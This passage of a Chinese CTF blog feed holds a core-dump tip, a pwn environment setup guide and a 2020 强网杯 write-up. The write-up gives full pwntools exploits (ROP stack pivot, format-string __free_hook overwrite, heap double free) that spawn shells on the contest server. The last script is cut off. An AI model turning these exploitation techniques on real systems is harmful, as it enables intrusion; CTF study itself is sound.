class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>),<span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.address+one[<span class="number">3</span>])+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>),<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">input()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这是不当人的一场比赛。。恰逢考试，还要一个人兼pwn和web，难受。。。。还好web不算太难，pwn的解题率就不尽人意了。。&lt;/p&gt;
&lt;h2
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
      <category term="WEB" scheme="https://nuoye-blog.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>core文件</title>
    <link href="https://nuoye-blog.github.io/2020/09/02/876d1c4/"/>
    <id>https://nuoye-blog.github.io/2020/09/02/876d1c4/</id>
    <published>2020-09-02T08:30:00.000Z</published>
    <updated>2020-09-02T08:18:58.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="core文件"><a href="#core文件" class="headerlink" title="core文件"></a>core文件</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>linux下做题时经常发现目录下会多一个core文件，一直不知道是干啥，直到前几天窥屏。。。才发现是程序当前内存的映射，可以结合gdb来查看。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="开启core-dump"><a href="#开启core-dump" class="headerlink" title="开启core dump"></a>开启core dump</h4><p>在命令行中输入<code>ulimit</code>命令来实现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c #返回值为0时，不会生成core dump文件</span><br><span class="line">ulimit -c unlimited #core dump文件大小不受限制</span><br><span class="line">ulimit -c 1024 #限制core dump文件大小为1024Kb</span><br></pre></td></tr></table></figure><p>以上命令只对当前终端有效。</p><p>永久生效的则需更改文件<code>/etc/security/limits.conf</code>。</p><h4 id="修改core文件保存路径"><a href="#修改core文件保存路径" class="headerlink" title="修改core文件保存路径"></a>修改core文件保存路径</h4><p>默认core文件保存在可执行文件所在的目录下，文件名为core。</p><p>通过修改<code>/proc/sys/kernel/core_uses_pid</code>文件可以让生成core文件名加上pid号。（1表示添加，2表示不添加）</p><p>还可通过修改<code>/proc/sys/kernel/core_pattern</code>来控制生成的core文件保存位置及文件名格式。如<code>echo &quot;/tmp/corefile-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</code>设置生成的core文件保存在/tmp/corefile目录下，文件名格式为<code>core-命令名-pid-时间戳</code>。</p><h4 id="core文件的使用"><a href="#core文件的使用" class="headerlink" title="core文件的使用"></a>core文件的使用</h4><p>利用命令<code>gdb program core</code>即可调试core文件。</p><h4 id="附：不产生core文件的情况"><a href="#附：不产生core文件的情况" class="headerlink" title="附：不产生core文件的情况"></a>附：不产生core文件的情况</h4><ol><li>进程是设置-用户-ID，而且当前用户并非程序文件的所有者。</li><li>进程是设置-组-ID，而且当前用户并非该程序文件的组所有者。</li><li>用户没有写当前工作目录的许可权。</li><li>文件太大。core文件的许可权(假定该文件在此之前并不存在)通常是用户读/写，组读和其他读。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;core文件&quot;&gt;&lt;a href=&quot;#core文件&quot; class=&quot;headerlink&quot; title=&quot;core文件&quot;&gt;&lt;/a&gt;core文件&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="ubuntu" scheme="https://nuoye-blog.github.io/tags/ubuntu/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="gdb" scheme="https://nuoye-blog.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>记Ubuntu 20.04环境搭建</title>
    <link href="https://nuoye-blog.github.io/2020/08/29/2307c607/"/>
    <id>https://nuoye-blog.github.io/2020/08/29/2307c607/</id>
    <published>2020-08-29T13:40:00.000Z</published>
    <updated>2020-08-29T13:38:05.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记Ubuntu-20-04环境搭建"><a href="#记Ubuntu-20-04环境搭建" class="headerlink" title="记Ubuntu 20.04环境搭建"></a>记Ubuntu 20.04环境搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提前写好pwn环境搭建留给学弟学妹？</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="vm虚拟机安装"><a href="#vm虚拟机安装" class="headerlink" title="vm虚拟机安装"></a>vm虚拟机安装</h3><p>首先上ubuntu官网下载iso文件，接着用vm新建即可。（省略）</p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>首先是换源，<a href="https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.3e221b110OXtnt" target="_blank" rel="noopener">参考地址</a></p><p>在terminal中输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bck</span><br><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后在弹出的文本中内容替换为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后保存即可。</p><p>然后再在terminal中输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>这样即可完成换源并更新。</p><h3 id="安装python和pip及pip换源"><a href="#安装python和pip及pip换源" class="headerlink" title="安装python和pip及pip换源"></a>安装python和pip及pip换源</h3><p>ubuntu20已经安装好了python3，不过习惯直接输入python打开，所以输入如下命令即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-is-python3</span><br></pre></td></tr></table></figure><p>这样就可以直接输入python来运行python3了。</p><p>接着输入如下命令安装pip：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><p>换源（<a href="https://mirrors.tuna.tsinghua.edu.cn/help/pypi/" target="_blank" rel="noopener">参考地址</a>）：</p><p>直接在terminal中输入如下命令即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>直接运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br></pre></td></tr></table></figure><p>PS：现在感觉都好容易，当年的，都是泪啊。</p><h3 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h3><p> <a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">官方网址</a></p><p>在terminal中输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>即可完成安装。</p><h6 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h6><p>运行setup.sh前，需修改以下内容：</p><p>​    1.将setup.sh中的第24行的<code>sudo apt-get -y install python-pip || true</code>，修改为<code>#sudo apt-get -y install python-pip || true</code>。</p><p>​    2.修改requirements.txt为如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">future</span><br><span class="line">isort!&#x3D;4.3.0</span><br><span class="line">pip</span><br><span class="line">psutil&gt;&#x3D;3.1.0</span><br><span class="line">pycparser</span><br><span class="line">pyelftools</span><br><span class="line">python-ptrace&gt;&#x3D;0.8</span><br><span class="line">ROPgadget</span><br><span class="line">six</span><br><span class="line">pygments</span><br><span class="line">capstone&#x3D;&#x3D;4.0.1</span><br><span class="line">enum34</span><br><span class="line">pytest</span><br><span class="line">testresources</span><br></pre></td></tr></table></figure><p>至此pwn的基础环境便安装完成了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;记Ubuntu-20-04环境搭建&quot;&gt;&lt;a href=&quot;#记Ubuntu-20-04环境搭建&quot; class=&quot;headerlink&quot; title=&quot;记Ubuntu 20.04环境搭建&quot;&gt;&lt;/a&gt;记Ubuntu 20.04环境搭建&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="vmware" scheme="https://nuoye-blog.github.io/tags/vmware/"/>
    
      <category term="ubuntu" scheme="https://nuoye-blog.github.io/tags/ubuntu/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>2020强网杯线上WP</title>
    <link href="https://nuoye-blog.github.io/2020/08/27/4fad9531/"/>
    <id>https://nuoye-blog.github.io/2020/08/27/4fad9531/</id>
    <published>2020-08-27T13:30:00.000Z</published>
    <updated>2020-08-27T13:31:32.708Z</updated>
    
    <content type="html"><![CDATA[<h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>message处存在溢出，可以修改esp，通过栈迁移到name，从而控制size，进而可以进行较大空间的rop，接着leak出libc地址和用onegadget进行getshell即可。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./babymessage"</span>)</span><br><span class="line">p = remote(<span class="string">"123.56.170.202"</span>,<span class="string">"21342"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./babymessage"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"message: "</span>)</span><br><span class="line">p.send(message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400ac3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400ac1</span></span><br><span class="line">pop_rbp = <span class="number">0x0000000000400748</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400886</span></span><br><span class="line">read_got = <span class="number">0x601038</span></span><br><span class="line">puts_plt = <span class="number">0x400670</span></span><br><span class="line">read_plt = <span class="number">0x4006A0</span></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">name(<span class="string">"\x00\x01"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x0000000000400748')</span></span><br><span class="line">message(<span class="string">"a"</span>*<span class="number">0x8</span>+p64(<span class="number">0x6010D0</span>+<span class="number">4</span>))</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x8</span>+p64(<span class="number">0x6010D0</span>+<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x6010D0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rbp)</span><br><span class="line">payload += p64(<span class="number">0x6010D0</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">message(payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)-libc.sym[<span class="string">'read'</span>]</span><br><span class="line">p.sendline(p64(<span class="number">0</span>)+p64(libc.address+one[<span class="number">1</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p><code>Remind me to</code>指令处存在格式化字符串漏洞，可以leak出栈和libc地址，接着修改<code>__free_hook</code>为onegadget，并利用printf输出长串字符时需要free原有缓存区并重新申请的功能，调用free，进而getshell。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./Siri"</span>)</span><br><span class="line">p = remote(<span class="string">"123.56.170.202"</span>,<span class="string">"12124"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./Siri"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_format</span><span class="params">(message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"Remind me to "</span>+message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">p.sendline(message)</span><br><span class="line">say_format(<span class="string">"%7$p%83$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) +<span class="number">0x118</span></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">libc.address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-231</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">addr = libc.address+one[<span class="number">2</span>]</span><br><span class="line">offset = <span class="number">14</span></span><br><span class="line">got = stack</span><br><span class="line">got = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">addr1 = addr &amp;<span class="number">0xffff</span></span><br><span class="line">pay1 = <span class="string">"%"</span>+str(addr1-len(<span class="string">"&gt;&gt;&gt; OK, I'll remind you to "</span>)<span class="number">-5</span>)+<span class="string">"c%"</span>+str(offset+<span class="number">2</span>)+<span class="string">"$hn"</span></span><br><span class="line">payload = pay1</span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">8</span> - len(pay1)%<span class="number">8</span>)</span><br><span class="line">payload += p64(got)</span><br><span class="line">say_format(<span class="string">" "</span>*<span class="number">5</span> + payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">addr2 = addr&gt;&gt;<span class="number">16</span> &amp;<span class="number">0xffff</span></span><br><span class="line">pay2 = <span class="string">"%"</span>+str(addr2-len(<span class="string">"&gt;&gt;&gt; OK, I'll remind you to "</span>)<span class="number">-5</span>)+<span class="string">"c%"</span>+str(offset+<span class="number">2</span>)+<span class="string">"$hn"</span></span><br><span class="line">payload = pay2</span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">8</span> - len(pay2)%<span class="number">8</span>)</span><br><span class="line">payload += p64(got+<span class="number">2</span>)</span><br><span class="line">say_format(<span class="string">" "</span>*<span class="number">5</span> + payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">addr3 = addr&gt;&gt;<span class="number">32</span> &amp;<span class="number">0xffff</span></span><br><span class="line">pay3 = <span class="string">"%"</span>+str(addr3-len(<span class="string">"&gt;&gt;&gt; OK, I'll remind you to "</span>)<span class="number">-5</span>)+<span class="string">"c%"</span>+str(offset+<span class="number">2</span>)+<span class="string">"$hn"</span></span><br><span class="line">payload = pay3</span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">8</span> - len(pay3)%<span class="number">8</span>)</span><br><span class="line">payload += p64(got+<span class="number">4</span>)</span><br><span class="line">say_format(<span class="string">" "</span>*<span class="number">5</span> + payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x12b1)')</span></span><br><span class="line">say_format(<span class="string">"%99999c"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>堆块申请后没有进行初始化，从而可以leak出libc和堆地址。</p><p>free时，index为有符号整数类型，并且没有要求其大于0，所以可以对存放name处的堆块进行double free，并以此申请到存放堆指针处，进而达到任意写。将<code>__free_hook</code>修改为system函数地址，从而getshell。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./babynotes"</span>)</span><br><span class="line">p = remote(<span class="string">"123.56.170.202"</span>,<span class="string">"43121"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./babynotes"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">p.sendline(size)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"note: "</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line">p.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"111"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"motto: "</span>)</span><br><span class="line">p.sendline(<span class="string">"111"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"age: "</span>)</span><br><span class="line">p.sendline(<span class="string">"33"</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Note 1: "</span>)</span><br><span class="line">heap = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span 